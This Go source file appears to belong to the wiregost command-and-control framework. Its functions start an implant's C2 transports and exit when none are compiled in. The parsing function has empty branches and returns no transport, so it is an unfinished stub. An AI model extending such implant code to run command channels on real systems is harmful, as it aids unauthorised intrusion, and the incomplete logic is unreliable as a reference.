package transport

import (
	"errors"

	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/security"
	tpb "github.com/maxlandon/wiregost/proto/v1/gen/go/transport"
)

// InitGhostComms - This function starts all the required components of the implant C2.
// It does not takes care of routing components.
// The functions checks for all compiled/available transports FOR IMPLANT COMMUNICATIONS/RPC ONLY.
// It inits the full transport system, with its "rotating" schemes and bind/reverse handlers.
func InitGhostComms() (err error) {

	tpLog.Infof("Initializing implant communications")

	startup, err := ParseCompiledTransports()
	if err != nil {
		tpLog.Error(err)
		security.Exit()
	}

	// Start it and add to active
	Transports.Add(startup, false)

	return
}

// ParseCompiledTransports - Get pre-compiled transports. We only return the one used for startup communications.
func ParseCompiledTransports() (start tpb.Transport, err error) {

	if assets.StartupTransport == "" && assets.OtherTransports == "" {
		return start, errors.New("failed to parse/find any pre-compiled transport.")
	}
	if assets.StartupTransport != "" {

	}

	if assets.OtherTransports != "" {

	}

	return
}
